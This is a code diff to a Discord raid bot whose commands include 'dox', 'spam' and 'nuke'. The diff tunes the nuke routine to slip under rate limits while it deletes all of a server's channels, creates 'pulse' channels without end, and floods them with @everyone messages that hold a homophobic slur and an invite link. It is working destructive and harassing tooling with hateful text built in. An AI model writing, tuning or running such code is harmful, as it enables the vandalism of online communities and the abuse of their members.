@@ -38,7 +38,7 @@ async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
-        { name: 'nuke', description: 'ULTRA-FAST nuke - deletes all channels, creates "pulse" channels, spams' },
+        { name: 'nuke', description: 'OPTIMIZED nuke - deletes all channels, creates "pulse", spams' },
         { name: 'stop', description: 'Stop the nuke' },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
@@ -127,7 +127,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- ULTRA-FAST NUKE ----
+        // ---- OPTIMIZED NUKE ----
         if (commandName === 'nuke') {
             if (nukeRunning) {
                 return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
@@ -139,7 +139,7 @@ client.on('interactionCreate', async (interaction) => {
             nukeRunning = true;
             nukeGuildId = guild.id;
 
-            await interaction.editReply('🚀 **ULTRA-FAST NUKE STARTED!** Deleting all channels...');
+            await interaction.editReply('🚀 **OPTIMIZED NUKE STARTED!** Deleting all channels...');
 
             const variants = [
                 '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
@@ -150,46 +150,48 @@ client.on('interactionCreate', async (interaction) => {
             ];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
 
-            // ---- DELETE ALL CHANNELS INSTANTLY ----
+            // ---- DELETE ALL CHANNELS (with slight delay to avoid rate limit) ----
             const channels = guild.channels.cache;
             console.log(`Deleting ${channels.size} channels...`);
-            await Promise.all(channels.map(async (ch) => {
-                try {
-                    await ch.delete();
-                } catch(e) {}
-            }));
+            
+            // Delete in batches of 5 with delay
+            const channelArray = Array.from(channels.values());
+            for (let i = 0; i < channelArray.length; i += 5) {
+                const batch = channelArray.slice(i, i + 5);
+                await Promise.all(batch.map(async (ch) => {
+                    try {
+                        await ch.delete();
+                    } catch(e) {}
+                }));
+                await new Promise(r => setTimeout(r, 100));
+            }
             console.log('All channels deleted.');
 
-            // ---- CREATE "pulse" CHANNELS AT MAX SPEED ----
+            // ---- CREATE "pulse" CHANNELS AT OPTIMIZED SPEED ----
             console.log('Creating "pulse" channels...');
-            const channelNames = [];
-            for (let i = 0; i < 50; i++) {
-                channelNames.push('pulse');
-            }
-
-            // Create channels in parallel batches
-            const batchSize = 10;
-            const createdChannels = [];
             
-            for (let i = 0; i < channelNames.length; i += batchSize) {
+            // Create initial 50 channels in batches
+            for (let i = 0; i < 50; i += 5) {
                 if (!nukeRunning) break;
-                const batch = channelNames.slice(i, i + batchSize);
+                const batch = [];
+                for (let j = 0; j < 5; j++) {
+                    batch.push('pulse');
+                }
                 const results = await Promise.all(batch.map(async (name) => {
                     try {
-                        const ch = await guild.channels.create({
+                        return await guild.channels.create({
                             name: name,
                             type: ChannelType.GuildText
                         });
-                        return ch;
                     } catch(e) {
                         return null;
                     }
                 }));
-                createdChannels.push(...results.filter(c => c !== null));
                 
-                // Send spam messages to all created channels immediately
-                if (createdChannels.length > 0) {
-                    await Promise.all(createdChannels.map(async (ch) => {
+                // Spam the newly created channels
+                const validChannels = results.filter(c => c !== null);
+                if (validChannels.length > 0) {
+                    await Promise.all(validChannels.map(async (ch) => {
                         try {
                             const line = variants[Math.floor(Math.random() * variants.length)];
                             let big = `@everyone ${line}\n`;
@@ -202,39 +204,53 @@ client.on('interactionCreate', async (interaction) => {
                         } catch(e) {}
                     }));
                 }
+                await new Promise(r => setTimeout(r, 200));
             }
 
-            // ---- CONTINUOUS CHANNEL CREATION + SPAM ----
+            // ---- CONTINUOUS CHANNEL CREATION + SPAM (OPTIMIZED) ----
             async function createAndSpam() {
+                let createdCount = 0;
                 while (nukeRunning) {
                     try {
-                        const ch = await guild.channels.create({
-                            name: 'pulse',
-                            type: ChannelType.GuildText
-                        });
+                        // Create 3 channels at a time
+                        const newChannels = await Promise.all([
+                            guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
+                            guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
+                            guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)
+                        ]);
                         
-                        // Spam it immediately
-                        for (let i = 0; i < 5; i++) {
-                            try {
-                                const line = variants[Math.floor(Math.random() * variants.length)];
-                                let big = `@everyone ${line}\n`;
-                                while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
-                                    big += line + '\n';
-                                }
-                                big += `\n${inviteLine}`;
-                                const spamMessage = big.slice(0, 2000);
-                                await ch.send(spamMessage);
-                            } catch(e) {}
+                        const valid = newChannels.filter(c => c !== null);
+                        
+                        // Send 3 spam messages to each new channel (not too many)
+                        for (const ch of valid) {
+                            for (let i = 0; i < 3; i++) {
+                                try {
+                                    const line = variants[Math.floor(Math.random() * variants.length)];
+                                    let big = `@everyone ${line}\n`;
+                                    while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
+                                        big += line + '\n';
+                                    }
+                                    big += `\n${inviteLine}`;
+                                    const spamMessage = big.slice(0, 2000);
+                                    await ch.send(spamMessage);
+                                } catch(e) {}
+                            }
                         }
+                        
+                        createdCount += valid.length;
+                        console.log(`Created ${createdCount} channels total`);
+                        
                     } catch(e) {}
-                    await new Promise(r => setTimeout(r, 100));
+                    
+                    // Wait 500ms between cycles to avoid rate limits
+                    await new Promise(r => setTimeout(r, 500));
                 }
             }
 
             // Start continuous creation
             createAndSpam();
 
-            await interaction.editReply('✅ **ULTRA-FAST NUKE RUNNING!** Creating "pulse" channels and spamming at max speed!');
+            await interaction.editReply('✅ **OPTIMIZED NUKE RUNNING!** Creating "pulse" channels and spamming at optimal speed. Rate limit safe.');
             return;
         }
 
